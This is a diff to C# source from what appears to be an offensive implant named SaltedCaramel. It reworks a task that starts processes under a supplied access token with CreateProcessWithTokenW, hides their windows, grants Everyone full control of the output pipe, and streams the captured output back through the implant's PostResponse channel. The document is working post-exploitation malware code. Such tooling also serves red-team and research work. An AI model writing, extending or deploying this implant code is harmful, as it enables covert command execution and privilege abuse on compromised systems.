@@ -54,177 +54,142 @@ namespace SaltedCaramel.Tasks
             // TODO: determine if this is safe to change
             string directory = "C:\\Temp";
 
-            // Use random name for our named pipe (used to retrieve output from process)
-            Random rnd = new Random();
-            string pipeName = "Caramel_" + rnd.Next();
-
-            // Set ACL on named pipe to allow any user to access
+            // Set security on anonymous pipe to allow any user to access
             PipeSecurity sec = new PipeSecurity();
             sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
 
-            // Create named pipe server and client
-            // We need to use nanmed pipes to communicate with processes started using the Win32 API
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(
-                pipeName,
-                PipeDirection.In,
-                NamedPipeServerStream.MaxAllowedServerInstances,
-                PipeTransmissionMode.Message,
-                PipeOptions.None,
-                4096,
-                4096,
-                sec);
-            NamedPipeClientStream pipeClient = new NamedPipeClientStream(
-                ".",
-                pipeName,
-                PipeDirection.Out,
-                PipeOptions.None);
 
             // TODO: Use anonymous pipes instead of named pipes
-            // AnonymousPipeServerStream anon = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.None, 1024, sec);
-            // AnonymousPipeClientStream anonClient = new AnonymousPipeClientStream(anon.GetClientHandleAsString());
-
-            try
+            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable, 1024, sec))
+            using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
             {
-                pipeClient.Connect();
-                pipeServer.WaitForConnection();
-
-                if (pipeClient.IsConnected)
+                try
                 {
-                    // TODO: Use anonymous pipes intead of named pipes
-                    // Set process to use named pipe for input/output
                     startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
                     startupInfo.hStdError = pipeClient.SafePipeHandle.DangerousGetHandle();
                     // STARTF_USESTDHANDLES ensures that the process will respect hStdInput/hStdOutput
                     // STARTF_USESHOWWINDOW ensures that the process will respect wShowWindow
                     startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES | (uint)Win32.STARTF.STARTF_USESHOWWINDOW;
                     startupInfo.wShowWindow = 0;
-                }
-                else
-                {
-                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");
-                    throw new Exception("Error connecting to named pipe server.");
-                }
 
-                // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
-                Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
+                    // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
+                    Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
 
-                // Finally, create our new process
-                bool createProcess = Win32.CreateProcessWithTokenW(
-                    TokenHandle,            // hToken
-                    IntPtr.Zero,            // dwLogonFlags
-                    null,                   // lpApplicationName
-                    file + " " + argString, // lpCommandLineName
-                    IntPtr.Zero,            // dwCreationFlags
-                    IntPtr.Zero,            // lpEnvironment
-                    directory,              // lpCurrentDirectory
-                    ref startupInfo,        // lpStartupInfo
-                    out newProc);           // lpProcessInformation
-                Thread.Sleep(100); // Something weird is happening if the process exits before we can capture output
-                if (createProcess) // Process started successfully
-                {
-                    Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
-                    SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
-                    implant.PostResponse(procStatus);
-                    // Trying to continuously read output while the process is running.
-                    using (StreamReader reader = new StreamReader(pipeServer))
+                    // Finally, create our new process
+                    bool createProcess = Win32.CreateProcessWithTokenW(
+                        TokenHandle,            // hToken
+                        IntPtr.Zero,            // dwLogonFlags
+                        null,                   // lpApplicationName
+                        file + " " + argString, // lpCommandLineName
+                        IntPtr.Zero,            // dwCreationFlags
+                        IntPtr.Zero,            // lpEnvironment
+                        directory,              // lpCurrentDirectory
+                        ref startupInfo,        // lpStartupInfo
+                        out newProc);           // lpProcessInformation
+
+                    Thread.Sleep(100); // Something weird is happening if the process exits before we can capture output
+
+                    if (createProcess) // Process started successfully
                     {
-                        SCTaskResp response;
-                        string message = null;
-                        List<string> output = new List<string>();
-
-                        try
+                        Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
+                        SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
+                        implant.PostResponse(procStatus);
+                        // Trying to continuously read output while the process is running.
+                        using (StreamReader reader = new StreamReader(pipeServer))
                         {
-                            Process proc = Process.GetProcessById(newProc.dwProcessId); // We can use Process.HasExited() with this object
+                            SCTaskResp response;
+                            string message = null;
+                            List<string> output = new List<string>();
 
-                            while (!proc.HasExited)
+                            try
                             {
-                                // Will sometimes hang on ReadLine() for some reason, not sure why
-                                // Workaround for this is to time out if we don't get a result in ten seconds
-                                Action action = () =>
+                                Process proc = Process.GetProcessById(newProc.dwProcessId); // We can use Process.HasExited() with this object
+
+                                while (!proc.HasExited)
                                 {
-                                    try
+                                    // Will sometimes hang on ReadLine() for some reason, not sure why
+                                    // Workaround for this is to time out if we don't get a result in ten seconds
+                                    Action action = () =>
                                     {
-                                        message = reader.ReadLine();
-                                    }
-                                    catch                                    {
+                                        try
+                                        {
+                                            message = reader.ReadLine();
+                                        }
+                                        catch
+                                        {
                                         // Fail silently if reader no longer exists
                                         // May happen if long running job times out?
                                     }
-                                };
-                                IAsyncResult result = action.BeginInvoke(null, null);
-                                if (result.AsyncWaitHandle.WaitOne(300000))
-                                {
-                                    if (message != null)
+                                    };
+                                    IAsyncResult result = action.BeginInvoke(null, null);
+                                    if (result.AsyncWaitHandle.WaitOne(300000))
                                     {
-                                        output.Add(message);
-                                        if (output.Count >= 5) // Wait until we have five lines to send
+                                        if (message != null)
                                         {
-                                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
-                                            implant.PostResponse(response);
-                                            output.Clear();
-                                            Thread.Sleep(implant.sleep);
+                                            output.Add(message);
+                                            if (output.Count >= 5) // Wait until we have five lines to send
+                                            {
+                                                response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
+                                                implant.PostResponse(response);
+                                                output.Clear();
+                                                Thread.Sleep(implant.sleep);
+                                            }
                                         }
                                     }
+                                    else
+                                    {
+                                        throw new Exception("Timed out while reading named pipe.");
+                                    }
                                 }
-                                else
+                            }
+                            catch (Exception e)
+                            {
+                                // Sometimes process may exit before we get this object back
+                                if (e.Message == "Timed out while reading named pipe.") // We don't care about other exceptions
                                 {
-                                    throw new Exception("Timed out while reading named pipe.");
+                                    throw e;
                                 }
                             }
-                        }
-                        catch (Exception e)
-                        {
-                            // Sometimes process may exit before we get this object back
-                            if (e.Message == "Timed out while reading named pipe.") // We don't care about other exceptions
+
+                            Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Process with PID " + newProc.dwProcessId + " has exited");
+
+                            pipeClient.Close();
+
+                            while (reader.Peek() > 0) // Check if there is still  data in the pipe
                             {
-                                throw e;
+                                message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
+                                foreach (string msg in message.Split(new[] { Environment.NewLine }, StringSplitOptions.None))
+                                {
+                                    output.Add(msg);
+                                }
+                            }
+                            if (output.Count > 0)
+                            {
+                                task.status = "complete";
+                                task.message = JsonConvert.SerializeObject(output);
+                                output.Clear();
                             }
                         }
 
-                        Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Process with PID " + newProc.dwProcessId + " has exited");
-
-                        pipeClient.Close();
-                        pipeClient.Dispose();
-
-                        while (reader.Peek() > 0) // Check if there is still  data in the pipe
-                        {
-                            message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
-                            foreach (string msg in message.Split(new[] { Environment.NewLine }, StringSplitOptions.None))
-                            {
-                                output.Add(msg);
-                            }
-                        }
-                        if (output.Count > 0)
-                        {
-                            task.status = "complete";
-                            task.message = JsonConvert.SerializeObject(output);
-                            output.Clear();
-                        }
+                        pipeServer.Close();
                     }
-
-                    pipeServer.Close();
-                    pipeServer.Dispose();
+                    else
+                    {
+                        string errorMessage = Marshal.GetLastWin32Error().ToString();
+                        Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
+                        pipeClient.Close();
+                        pipeServer.Close();
+                        task.status = "error";
+                        task.message = errorMessage;
+                    }
                 }
-                else
+                catch (Exception e)
                 {
-                    string errorMessage = Marshal.GetLastWin32Error().ToString();
-                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
                     pipeClient.Close();
                     pipeServer.Close();
-                    pipeClient.Dispose();
-                    pipeServer.Dispose();
                     task.status = "error";
-                    task.message = errorMessage;
+                    task.message = e.Message;
                 }
-            }
-            catch (Exception e)
-            {
-                pipeClient.Close();
-                pipeServer.Close();
-                pipeClient.Dispose();
-                pipeServer.Dispose();
-                task.status = "error";
-                task.message = e.Message;
             }
         }
 
